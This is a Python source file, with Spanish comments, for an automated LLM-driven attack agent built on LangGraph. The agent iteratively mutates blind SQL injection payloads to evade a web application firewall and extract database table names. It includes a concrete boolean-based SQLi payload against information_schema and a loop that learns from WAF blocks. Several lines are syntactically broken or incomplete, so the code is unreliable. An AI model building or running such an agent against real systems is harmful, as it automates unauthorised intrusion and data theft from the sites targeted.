import os
import json
import asyncio
from typing import TypedDict, Annotated, List, Dict, Any
from langgraph.graph import StateGraph, END
from dual_llm_pattern import LocalDualLLM
from mutators import SQLMutator

# Esquema de estado optimizado para Context Folding y Aislamiento
class AgentState(TypedDict):
    mission: str
    target_url: str
    current_payload: str
    exfiltrated_data: str
    iteration: int
    status: str
    # Mejora 3: Historial comprimido para evitar desbordamiento de RAM
    failed_attempts_summary: List] 
    last_response_metadata: Dict[str, Any]
    waf_metadata: Dict[str, Any] # Solo JSON sanitizado, nunca logs crudos

class ArtOfIAOrchestrator:
    def __init__(self, target_url: str):
        self.brain = LocalDualLLM(model="ollama/qwen3.5:9b")
        self.mutator = SQLMutator()
        self.target_url = target_url
        self.progress_file = "progress.txt"
        self.max_iterations = 15

    def _load_progress(self) -> str:
        if os.path.exists(self.progress_file):
            with open(self.progress_file, "r") as f:
                return f.read().strip()
        return ""

    async def planner_node(self, state: AgentState):
        """Nodo de Planificación - Ralph Loop con Context Folding."""
        iteration = state.get("iteration", 0)
        
        # Mejora 3: Context Folding (Plegado de Historial) para proteger 16GB RAM
        # Si superamos 5 intentos, consolidamos lo aprendido y purgamos basura 
        history = state.get("failed_attempts_summary",)
        if iteration > 5:
            print("[*] Aplicando Context Folding: Resumiendo historial de ataques...")
            summary_prompt = f"Resume estos fallos en 3 puntos tácticos: {history}"
            # Se genera un resumen semántico para liberar memoria VRAM/RAM
            history =

        return {
            "iteration": iteration + 1,
            "exfiltrated_data": self._load_progress(),
            "failed_attempts_summary": history,
            "status": "calculating_next_move"
        }

    async def quarantine_node(self, state: AgentState):
        """Mejora 2: Sanitización Estricta (Action-Selector Pattern)."""
        # El PrivilegedLLM NUNCA lee el log crudo para evitar Prompt Injection 
        raw_logs = self._read_latest_waf_logs()
        
        # El QuarantineLLM actúa como decodificador a JSON aséptico
        sanitized_json = await self.brain.quarantine_parse(raw_logs)
        
        print(f"[*] Log sanitizado. Regla detectada: {sanitized_json.get('rule_id')}")
        return {"waf_metadata": sanitized_json}

    async def sniper_node(self, state: AgentState):
        """Nodo Sniper - Toma decisiones basadas solo en metadatos sanitizados."""
        # Se inyecta conocimiento experto dinámico desde la DB vectorial local
        rule_id = state["waf_metadata"].get("rule_id", "generic")
        tactic = await self.brain.get_expert_tactic(rule_id) 
        
        # El LLM elige la estrategia técnica de mutators.py
        strategy = await self.brain.decide_strategy(state, tactic)
        
        mutated_payload = self.mutator.apply(state["current_payload"], strategy)
        return {"current_payload": mutated_payload}

    async def reflector_node(self, state: AgentState):
        """Mejora 1: Validator Node Determinista (Judge Node)."""
        # Ya no usamos un LLM para 'adivinar' si hackeamos. Usamos métricas reales .
        response = await self._execute_request(state["current_payload"])
        
        # Lógica binaria determinista para Boolean-Based Blind SQLi [1]
        # Comparamos si la respuesta contiene el indicador de 'True' vs 'False'
        success_indicator = "Welcome back" # Ejemplo de cadena exitosa
        is_successful = success_indicator in response.text
        
        if is_successful:
            print(f"[+] ¡ÉXITO! Carácter validado determinísticamente.")
            return {"status": "success", "last_response_metadata": {"length": len(response.text)}}
        
        # Si falla, registramos el intento para el Ralph Loop
        return {
            "status": "blocked" if response.status_code == 406 else "failed",
            "failed_attempts_summary": state["failed_attempts_summary"] + [{"payload": state["current_payload"]}]
        }

    def build_graph(self):
        workflow = StateGraph(AgentState)
        
        workflow.add_node("planner", self.planner_node)
        workflow.add_node("quarantine", self.quarantine_node)
        workflow.add_node("sniper", self.sniper_node)
        workflow.add_node("reflector", self.reflector_node)

        workflow.set_entry_point("planner")
        workflow.add_edge("planner", "reflector")
        
        # Ruteo basado en el Validator Determinista
        workflow.add_conditional_edges(
            "reflector",
            lambda x: "quarantine" if x["status"] in ["blocked", "failed"] else END,
            {"quarantine": "quarantine", END: END}
        )
        
        workflow.add_edge("quarantine", "sniper")
        workflow.add_edge("sniper", "reflector")

        return workflow.compile()

# Implementación de ejecución asíncrona principal
async def main():
    orchestrator = ArtOfIAOrchestrator(target_url="http://target-waf/")
    app = orchestrator.build_graph()
    
    print("=========================================================")
    print(" ART OF IA v2.0 - ARCHITECTURE: REDAMON + DUAL-LLM ")
    print("=========================================================")
    
    # El bot ahora es resiliente al reinicio y al agotamiento de RAM
    state = {
        "mission": "Listar tablas de la DB 'artofia'",
        "current_payload": "1' AND (ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='artofia' LIMIT 1),1,1)))=97--",
        "iteration": 0,
        "failed_attempts_summary":
    }
    
    async for output in app.astream(state):
        pass # La persistencia se maneja internamente en los nodos

if __name__ == "__main__":
    asyncio.run(main())